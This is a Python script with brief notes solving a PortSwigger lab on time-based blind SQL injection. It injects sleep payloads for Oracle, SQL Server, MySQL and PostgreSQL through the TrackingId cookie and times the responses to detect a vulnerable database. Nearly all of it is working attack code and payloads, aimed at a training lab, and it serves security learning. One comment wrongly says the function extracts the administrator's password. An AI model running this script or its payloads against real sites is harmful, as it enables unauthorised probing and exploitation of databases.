'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

1. Vulnerability:  Tracking Cookie (Blind SQLi)

2. Goal: 1. Proving the field is vulnerable to SQL injection
         2. Cause 10 Second Time Delay

3 Analysis: 1. Time delays
                Query : SELECT tacking-id FROM tacking-table WHERE tracking-id='<id>';


                [-] Oracle 	dbms_pipe.receive_message(('a'),10)    # ' || (dbms_pipe.receive_message(('a'),10))--
                [-] Microsoft 	WAITFOR DELAY '0:0:10'     # ' || (WAITFOR DELAY '0:0:10')--
                [+] PostgreSQL 	SELECT pg_sleep(10)    # ' || (SELECT pg_sleep(10))--
                [-] MySQL 	SELECT SLEEP(10)    # ' || (SELECT SLEEP(10))-- 
        
                
            
4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-13/sqli-lab-13.py

'''


import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup  # Ensure you have BeautifulSoup installed

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy for HTTP requests (if needed)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Helper function to send the payload and return the response
def send_payload(url, cookies):
    try:
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    except:
        # If there's an issue with the proxy, send the request without it
        response = requests.get(url, cookies=cookies, verify=False)
    return response

# Function to extract the administrator's password using SQL injection
def Bling_SQLi(url, tracking_id, session_id):
    
    #Oracle
    payload1 = "' || (dbms_pipe.receive_message(('a'),10))--"
    sql_payload1 = urllib.parse.quote(payload1)

    #Microsoft
    payload2 = "' || (WAITFOR DELAY '0:0:10')--"
    sql_payload2 = urllib.parse.quote(payload2)

    #MySQL
    payload3 = "' || (SELECT SLEEP(10))-- "
    sql_payload3 = urllib.parse.quote(payload3)
    
    #PostgreSQL
    payload4 = "' || (SELECT pg_sleep(10))--"
    sql_payload4 = urllib.parse.quote(payload4)

    cookies1 = {'TrackingId': tracking_id + sql_payload1, 'session': session_id}
    print("\n(+) Sending payload for Oracle Database\n%s"%payload1)
    response1 = send_payload(url, cookies1)
    if int(response1.elapsed.total_seconds())>10:
        print("[+] Vulnerable to Blind SQLi (Oracle)\n")
    else:
        print("[-] Wrong Database -> Oracle\n")

    
    cookies2 = {'TrackingId': tracking_id + sql_payload2, 'session': session_id}
    print("\n(+) Sending payload for Microsoft Database\n%s"%payload2)
    response2 = send_payload(url, cookies2)
    if int(response2.elapsed.total_seconds())>10:
        print("[+] Vulnerable to Blind SQLi (Microsoft)\n")
    else:
        print("[-] Wrong Database -> Microsoft\n")
    
    cookies3 = {'TrackingId': tracking_id + sql_payload3, 'session': session_id}
    print("\n(+) Sending payload for MySQL Database\n%s"%payload3)
    response3 = send_payload(url, cookies3)
    if int(response3.elapsed.total_seconds())>10:
        print("[+] Vulnerable to Blind SQLi (MySQL)\n")
    else:
        print("[-] Wrong Database -> MySQL\n")

    cookies4 = {'TrackingId': tracking_id + sql_payload4, 'session': session_id}
    print("\n(+) Sending payload for PostgreSQL Database\n%s"%payload4)
    response4 = send_payload(url, cookies4)
    if int(response4.elapsed.total_seconds())>=10:
        print("[+] Vulnerable to Blind SQLi (PostgreSQL)\n")
    else:
        print("[-] Wrong Database -> PostgreSQL\n")
     

def get_initial_cookies(url):
    try:
        response = requests.get(url, verify=False, proxies=proxies)
    except:
        response = requests.get(url, verify=False)
    
    # Extract cookies from the response
    tracking_id = response.cookies.get('TrackingId', '')
    session_id = response.cookies.get('session', '')

    print("[+] Extracted Tracking ID: %s"%tracking_id)
    print("[+] Extracted Session: %s"%session_id)

    # Check if cookies were retrieved successfully
    if not tracking_id or not session_id:
        print("[-] Failed to retrieve cookies from the target website.")
        sys.exit(1)  # Exit if cookies are not found

    return tracking_id, session_id


# Main function to execute the SQL injection attack
def main(): 
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        # Edit The url
        url = 'https://0a95001203c980fac3df7a8b003d00a8.web-security-academy.net'  # Update Domain here  
    
    print("[*] Retrieving initial cookies from the website...")
    tracking_id, session_id = get_initial_cookies(url)  # Retrieve the cookies dynamically
    
    print("[*] Checking if Tracking id is vulnerable to blind SQLi")
    Bling_SQLi(url, tracking_id, session_id)  # Exploiting the Vulnerability

# Run the main function when the script is executed
if __name__ == "__main__":
    main()



